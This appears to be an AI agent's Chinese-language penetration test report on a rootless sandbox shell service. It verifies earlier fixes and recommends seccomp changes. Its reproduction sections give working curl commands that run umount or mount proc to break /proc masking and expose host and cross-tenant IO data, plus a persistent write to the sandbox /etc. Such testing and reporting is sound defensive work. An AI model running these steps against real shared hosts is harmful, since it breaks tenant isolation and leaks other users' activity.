# BASHGATE 第五轮渗透测试报告（AI Agent）

- 日期：2026-09-29 16:20–17:00（北京时间）
- 测试者：AI Agent（第五轮，针对修复后版本）
- 目标：http://49.*.*.*:8080（仅对该 IP 发起流量）
- 结论速览：**上一轮报告的 6 个问题修得非常干净**（超时真杀、cgroup 内存限制、E2BIG 槽位泄漏、/proc 假文件墙、宿主 /etc 摘除、diskstats 遮蔽）。但架构从"uid 1001 + 零能力"切换到"**用户命名空间 root + 全量 ns 能力**"，这个新模型带出一个非预期副作用：**ns-root 拿到 CAP_SYS_ADMIN 后，/proc 假文件墙用一条 `umount` 就拆掉了**，跨租户侧信道复活；镜像 /etc 也可写。

---

## 摘要

1. **修复验证：6/6 修对了**——30s 超时进程真被杀（sleep 35 → durMs 30023、无 post-deadline 输出）；内存 cgroup 真生效（190MB 过 / 210MB 被信号杀，连 tmpfs inode 的内核内存都计入——30 万文件 fd 测试 1.4s 被 OOM）；E2BIG 槽位泄漏已 try/finally（3 连发后槽位 3/3 完好）；宿主 /etc 不再 bind；diskstats/meminfo/loadavg/stat/uptime 被 /srv/proc-mask 假文件遮蔽。
2. **新漏洞（本报告核心）**：执行模型改为 userns-root（uid_map `0→1001`、CapEff=0x1ffffffffff、NoNewPrivs=1、seccomp×6）。seccomp 封了 mknod 却**没封 mount/umount2** → ns-root `umount /proc/{meminfo,loadavg,stat,diskstats,uptime}` 或直接 `mount -t proc none /tmp/p2` 双路径拆墙，**宿主真实计数器与其他租户 loop 设备 IO 全部重新可见**（目标 #5 复活，并附 50MB 跨租户实时观测演示）。
3. **目标 #2 弱形式达成**：ns-root 对沙箱镜像自身的 /etc 具有写权限（持久化跨请求，已在授权目录之外）；host `/usr/local` 只读暴露安骑士(aegis)、云监控及自定义 cpu-check.sh（阿里云防护栈指纹）。
4. userB 数据、宿主磁盘、跨租户文件、真实提权（host 侧）依旧打不穿——userns 边界 + unmapped inode 的 DAC 规则 + seccomp（mknod/关键挂载白名单外）这堵墙本身是成立的。

---

## 达成的目标

### 目标 #5（复活）：拆掉 /proc 假文件墙 —— umount 或新挂 proc

**背景**：本轮沙箱以 ns-root 运行（`id` → `uid=0(root)`，`/proc/self/uid_map` → `0 1001 1`），CapEff 全量。/proc 被"假 proc 压真 proc + 假文件 bind"双层遮蔽（mountinfo 可见 `/srv/proc-mask/*` → `/proc/*`）。但 mount ns 属于我的 userns，ns-root 拥有 CAP_SYS_ADMIN，**umount/mount 不在 seccomp 黑名单里**。

**复现 A（拆墙）**：

```bash
TA=<userA token>
curl -s -X POST http://49.*.*.*:8080/shell -H "Authorization: Bearer $TA" \
  -H 'Content-Type: application/json' \
  -d '{"cmd":"umount /proc/diskstats /proc/stat /proc/meminfo /proc/loadavg /proc/uptime; grep loop1 /proc/diskstats; head -1 /proc/loadavg"}'
```

**复现 B（无视墙，直接挂新的）**：

```bash
-d '{"cmd":"mkdir -p /tmp/p2; mount -t proc none /tmp/p2; grep loop1 /tmp/p2/diskstats; head -2 /tmp/p2/meminfo"}'
```

**实测输出**：

```
7 0 loop0 144 0 4458 16 172 298 6904 87 ...   ← userA 镜像
7 1 loop1 117 0 4362 18 104 147 2048 46 ...   ← userB 镜像 IO 可见
0.00 0.00 0.00 1/258 9                        ← 宿主真实负载，258 调度实体
MemTotal: 1651808 kB / MemFree: 659484 kB     ← 宿主真实内存
PROC-MOUNT-OK                                  ← 复现 B 也成功
```

**跨租户实时观测演示**（userA 读 loop1 计数 → userB 写 50MB → userA 再读）：

```
loop1 before: ... 138 153 27760 127 ...
loop1 after : ... 206 161 130272 866 ...
→ 扇区差 +102512 = 50.05 MiB，与 userB 的 dd bs=1M count=50 精确吻合
```

**原理**：per-mount 假文件遮蔽依赖"租户没有挂载能力"这一假设；模型切到 userns-root 后假设不成立。每次 exec 都是全新 ns，攻击者每个请求重拆一次即可（成本一条命令）。

### 目标 #2（弱形式）：沙箱镜像 /etc 可写（授权目录之外的持久写入）

**复现**：

```bash
-d '{"cmd":"touch /etc/PWNED_R5 && ls -la /etc/PWNED_R5"}'
# 新的请求验证持久性：
-d '{"cmd":"ls -la /etc/PWNED_R5"}'
```

**实测**：文件创建成功且跨请求持久（测试后已删除）。
**原理**：镜像内系统目录属主显示为 root，ns-root（映射自 host 1001）对其拥有 DAC 权限。租户可以改写自己沙箱的 /etc/passwd、nsswitch.conf、resolv.conf 等——单租户沙箱内影响有限（非 login shell 不加载 profile；网关不读镜像 /etc），但属于"授权目录（/home/usera）之外"的持久写入。若产品预期是"工作区之外只读"，这里是偏差。

### 目标 #7：host /usr/local 信息暴露 + 防护栈指纹

`/usr` 仍为宿主 vda3 只读 bind，其下 `/usr/local/` 暴露：`aegis/`（阿里云安骑士）、`cloudmonitor/`、`agent_install-1.16.sh`（18KB 安装脚本可读）、`bin/cpu-check.sh`（防守方自己的负载告警脚本，内容完整可读）。获得：云防护产品型号与版本、防守方运维习惯。`/usr/local/bin` 位于执行 PATH 首位（`/usr/local/bin:/usr/bin:/bin`），因只读 + unmapped DAC 不可篡改。

### 目标 #7（小项）：命令内容过滤器的存在与形状

发现网关存在命令字符串内容过滤：cmd 含 `\0` 或 `\x00` 字面序列 → 直接 SPAWN_ERROR（durMs=0，不执行）；`\n` 等其他转义不受影响。过滤器绕过无技术价值（真实 NUL 本就无法进 argv），但记录为：网关有隐式 WAF 层，且报错与普通 spawn 失败不可区分（取证不友好）。另：输出上限实测仍为 128KB（此前 196KB 是 JSON 转义后的表现层假象）。

---

## 失败的尝试（本轮新增 + 旧路复查）

| 攻击面 | 尝试方法 | 系统回应 | 分析 |
|---|---|---|---|
| 宿主磁盘裸读（ns-root 版） | `mknod /home/usera/vda3node b 253 3`、连自家 `loop0` 也试 | EPERM | seccomp 封死 mknod——**连 ns-root 也不行**，这条封得对 |
| cgroup 越权改写 | `mount -t cgroup2 none /tmp/cg` + 写 memory.max | `permission denied` | cgroup2 在无委托的 userns 中不可挂载 |
| 宿主 /usr 改写 | `mount -o remount,rw /usr` + touch | remount denied；RO | /usr 的 bind remount 被正确拒绝 |
| 假文件篡改 | 写 /opt/proc-mask/*（nobody 属主） | EACCES | unmapped inode（host-root 的 0 → ns 内 65534）不受 ns-root 的 DAC override 影响——内核规则站住了 |
| FUSE | SUID fusermount3 + /dev/fuse | 无 /dev/fuse 且 mknod 被封 | 死路 |
| 跨请求进程持久化 | `(setsid bash -c '…60×tick…' &)` 后跨请求查 orphan.log | 日志根本不存在 | exec 结束 PID ns 整体回收，setsid 逃不掉 |
| fd 表耗尽（绕过内存限制的思路） | 单 exec 开 30 万个 /tmp 文件 | 1.4s 被杀（exitCode=null） | **tmpfs inode 内核内存计入 cgroup memory**，kmem 侧通道也被封；且宿主 file-max=int64max，无宿主表可耗尽 |
| 提权到 host（userns 逃逸) | uid_map 只含 `0→1001` 单条；newuidmap 扩展映射 | 无父 ns 能力，不可写新映射 | 单值映射 + NNP + seccomp，标准 rootless 容器边界，成立 |
| 原型污染 | `__proto__`/`constructor.prototype` 注入 body（home/user/timeoutSec） | 无效果，无持久化 | 无危险 merge 路径 |
| 登录边界 | UserA/usera/USERA/' userA' 变体 | 全部 401 | 严格匹配 |
| 新端点 | /admin /status /debug /metrics /health /sessions /config（认证态 POST） | 全 404 | 无新增管理面 |
| 旧洞复查 | sleep 35 / 190-210MB / E2BIG×3 / mountinfo | 全部按修复后预期行为 | 6/6 修复有效（详见摘要） |

---

## 架构推测（v7 = rootless 化重构）

```
[阿里云 ECS] 2C/1.6G/无swap，Ubuntu 24.04（内核 6.8.0-63），安骑士 + 云监控 + 自写 cpu-check.sh
 ├─ :80/:443 另一业务；:22 过滤；:8080 bashgate（Node.js，无反代）
 └─ /shell v7 执行模型：
      auth → 并发槽（per-user ≤3，try/finally 闭环，E2BIG→SPAWN_ERROR 友好返回）→
      unshare(USER|MTN|PID|UTS|IPC|NET) + uid_map{0→1001}（单值映射）→
      cgroup v2（MemoryMax≈200M，含 kmem；超限 SIGKILL→exitCode null）→
      组装 mount 树：loop 镜像（/.root 系统区 + /workspace→home）、宿主 /usr ro bind、
        /srv/proc-mask rw bind 到 /opt/proc-mask 并覆盖 /proc/{5 个计数文件}、
        一次性 tmpfs(/tmp,/var/tmp,/dev/shm)、精简版镜像 /etc（root+usera+nobody 三行 passwd）→
      pivot_root → 落地为 ns-root + 全量 ns caps + NNP + seccomp×6（封 mknod，未封 mount/umount2）→
      bash -c 'cd $HOME; <cmd>'（30s 真超时：杀进程组/整 ns）
```

**修复评价**：上一轮的 6 项修复全部验证有效，工程上很干净（cgroup 连 kmem 都罩住了，超时从"贴标签"变成真杀）。本轮唯一的实质缺口是**模型切换时引入的能力不一致**：为了 ns-root 下工具兼容性保留了 CAP_SYS_ADMIN，seccomp 只封了 mknod 没封 mount/umount2——而 /proc 遮蔽方案恰恰完全依赖"租户无挂载能力"。

---

## 修复建议（按优先级）

1. **封 mount/umount2（一行 seccomp，收益最大）**：在既有 6 层 seccomp 上追加对 `mount/symlinkat 无关…`——具体即 `mount`、`umount2`、`pivot_root`、`move_mount`、`open_tree`、`fsopen/fsconfig/fsmount`（fsconfig 顺带封掉），以及 `mknod/mknodat`（已有）。若业务确需租户自挂载，白名单化 tmpfs/proc 且**禁止 umount 非自挂载点**（记录挂载 ID 校验）。
2. **或者放弃 ns-root 模型回到 uid1001**：若 /proc 遮蔽必须保留，最小能力集才是它的前提。二选一：**(a) 保留 ns-root → seccomp 封挂载类调用**；(b) 保留 mask → 回退到无 CAP_SYS_ADMIN 的执行身份。当前组合是"给了钥匙又糊了锁"。
3. **镜像 /etc 写权限按产品预期收敛**：若"工作区之外只读"是预期，把系统区挂为只读 bind（loop 镜像两次挂载：系统区 ro、workspace rw），或在设定镜像属主时避开 ns-root 的映射区间。
4. **waf 报错可观测性**：内容过滤触发时建议返回独立错误码（如 `REJECTED_BY_POLICY`），与 SPAWN_ERROR 区分，便于自己排障与发现误伤（`echo '\0'` 会被拒）。
5. **/usr/local 指纹**：aegis/cloudmonitor/cpu-check.sh 对租户可读属于低风险但可避免的信息暴露；若在意，/usr 也换为白名单文件级 bind 或镜像内置精简 /usr/local。
6. **记录在案的优点**（保持住）：真超时击杀对管道阻塞型进程同样生效（`yes` 30.2s 被杀）；E2BIG 路径槽位闭环；unmapped-inode 的 DAC 规则没有为 ns-root 破例；登录/端点/参数处理依旧干净。

---

## 附：测试痕迹与影响说明

- 沙箱内测试产物已清理：/etc/PWNED_R5、/home/usera/WR_TEST、/tmp/p2、/tmp/cg、noise*.bin 等均已删除（镜像 /etc 恢复原状；orphan.log 未生成过）。
- 本轮未触发任何宿主级资源事件；eatmem.py（防守方上轮投喂物，本轮被完整保留在镜像里）在 300MB 调用下被 cgroup 正确击杀，未做更大规模尝试。
- 唯一持久状态：无（并发槽位本轮全程健康）。
- 全部流量仅指向 49.*.*.*。
